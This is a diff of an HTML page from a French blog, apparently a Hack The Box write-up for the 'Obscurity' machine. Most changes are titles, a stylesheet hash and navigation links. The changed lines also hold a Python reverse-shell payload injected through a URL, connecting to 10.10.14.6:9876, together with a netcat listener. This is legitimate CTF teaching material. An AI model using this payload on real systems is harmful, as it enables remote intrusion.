@@ -17,17 +17,17 @@
     
     
 
-<title>Medium - Obscurity • LOLOLEKIK</title>
+<title>Obscurity - Medium • LOLOLEKIK</title>
 
 
 <meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="Medium - Obscurity"/>
+<meta name="twitter:title" content="Obscurity - Medium"/>
 <meta name="twitter:description" content="Résolution de la box Obscurity
 Introduction La box Obscurity de Hack The Box est une box Linux de difficulté &ldquo;Medium&rdquo;.
 Foothold Enumération On commence par faire un nmap en enregistrant le résultat dans un xml pour pouvoir l&rsquo;utiliser avec searchsploit.
 ┌──(lololekik㉿Ashitaka)-[~/Documents/htb/obscurity] └─$ sudo nmap -p- -A obscurity.htb -oX obscurity.htb Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-27 13:21 CET Nmap scan report for obscurity.htb (10.10.10.168) Host is up (0.034s latency). Not shown: 65531 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7."/>
 
-<meta property="og:title" content="Medium - Obscurity" />
+<meta property="og:title" content="Obscurity - Medium" />
 <meta property="og:description" content="Résolution de la box Obscurity
 Introduction La box Obscurity de Hack The Box est une box Linux de difficulté &ldquo;Medium&rdquo;.
 Foothold Enumération On commence par faire un nmap en enregistrant le résultat dans un xml pour pouvoir l&rsquo;utiliser avec searchsploit.
@@ -49,7 +49,7 @@ Foothold Enumération On commence par faire un nmap en enregistrant le résultat
 
 
 
-<link rel="stylesheet" href="/scss/hyde-hyde.2aa50c1cef9d4c1452dcd5fdae0f04b8af0b434ba4411ac5045b3b0fb71da69a.css" integrity="sha256-KqUMHO&#43;dTBRS3NX9rg8EuK8LQ0ukQRrFBFs7D7cdppo=">
+<link rel="stylesheet" href="/scss/hyde-hyde.816e5b26c5966343ef21f902ba05a763964deb2ae3fdcd9a954614131b756c59.css" integrity="sha256-gW5bJsWWY0PvIfkCugWnY5ZN6yrj/c2alUYUExt1bFk=">
 
 
 <link rel="stylesheet" href="/scss/print.2744dcbf8a0b2e74f8a50e4b34e5f441be7cf93cc7de27029121c6a09f9e77bc.css" integrity="sha256-J0Tcv4oLLnT4pQ5LNOX0Qb58&#43;TzH3icCkSHGoJ&#43;ed7w=" media="print">
@@ -195,7 +195,7 @@ Built with <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.c
     
 <article>
   <header>
-    <h1>Medium - Obscurity</h1>
+    <h1>Obscurity - Medium</h1>
     
     
 <div class="post__meta">
@@ -634,7 +634,7 @@ total 24
 -rw-r--r-- 1 lololekik lololekik    13 27 janv. 14:40 pwn.txt
 -rwxr-xr-x 1 lololekik lololekik   662 27 janv. 14:40 test.py
 
-</code></pre><p>Je vais maintenant m&rsquo;envoyer un reverse shell via l&rsquo;url suivante : <a href="http://obscurity.htb">http://obscurity.htb</a>:8080/';import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&lsquo;10.10.14.6&rsquo;,9876));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);#</p>
+</code></pre><p>Je vais maintenant m&rsquo;envoyer un reverse shell via l&rsquo;url suivante : <a href="http://obscurity.htb:8080/';import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.14.6',9876));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(%5B'/bin/sh','-i'%5D);#">http://obscurity.htb:8080/';import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.14.6',9876));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);#</a></p>
 <p>Cependant lors  de l&rsquo;envoi de la requête le &ldquo;#&rdquo; pour le commentaire s&rsquo;effacé, je l&rsquo;ai donc rajouté avec burp.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-zsh" data-lang="zsh">┌──<span style="color:#f92672">(</span>lololekik㉿Ashitaka<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
 └─$ nc -nlvp <span style="color:#ae81ff">9876</span>                                                                                                                                                                                                                      <span style="color:#ae81ff">1</span> ⨯
@@ -704,14 +704,14 @@ robert@Obscure$
 
 <div class="navigation navigation-single">
     
-    <a href="/hack-the-box/resolute/" class="navigation-prev">
+    <a href="/hack-the-box/openadmin/" class="navigation-prev">
       <i aria-hidden="true" class="fa fa-chevron-left"></i>
-      <span class="navigation-tittle">Medium - Resolute</span>
+      <span class="navigation-tittle">OpenAdmin - Easy</span>
     </a>
     
     
-    <a href="/hack-the-box/monteverde/" class="navigation-next">
-      <span class="navigation-tittle">Medium - Monteverde</span>
+    <a href="/hack-the-box/mango/" class="navigation-next">
+      <span class="navigation-tittle">Mango - Medium</span>
       <i aria-hidden="true" class="fa fa-chevron-right"></i>
     </a>
     
